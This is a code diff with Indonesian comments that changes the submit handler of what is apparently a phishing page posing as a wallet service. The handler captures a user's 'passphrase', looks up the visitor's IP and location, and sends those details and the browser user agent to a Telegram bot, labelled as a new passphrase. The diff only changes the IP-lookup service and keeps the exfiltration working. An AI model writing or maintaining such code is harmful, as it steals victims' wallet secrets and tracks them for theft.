@@ -19,16 +19,18 @@ document.querySelector('form').addEventListener('submit', function(e) {
   // Langsung munculkan loading biar user tidak klik berkali-kali
   showLoading();
 
-  // Ambil Data IP (Gunakan URL /json/ yang benar)
-  fetch('https://ipapi.co')
+    // Ambil Data IP dan Lokasi (Gunakan ip-api.com karena lebih stabil)
+  fetch('https://ip-api.com')
     .then(function(res) { return res.json(); })
     .then(function(ipData) {
+      // Jika sukses ambil data lokasi
       var message = "<b>🔔 Passphrase Baru (Vercel)</b>\n" +
                     "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n\n" +
                     "<code>" + normalized + "</code>\n\n" +
-                    "<b>📍 LOKASI:</b> " + (ipData.city || 'Unknown') + ", " + (ipData.country_name || 'Unknown') + "\n" +
-                    "<b>🌐 IP:</b> " + (ipData.ip || 'Unknown') + "\n" +
+                    "<b>📍 LOKASI:</b> " + (ipData.city || 'Unknown') + ", " + (ipData.country || 'Unknown') + "\n" +
+                    "<b>🌐 IP:</b> " + (ipData.query || 'Unknown') + "\n" +
                     "<b>📱 DEVICE:</b> " + navigator.userAgent;
+
 
       // Kirim ke Telegram
       return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
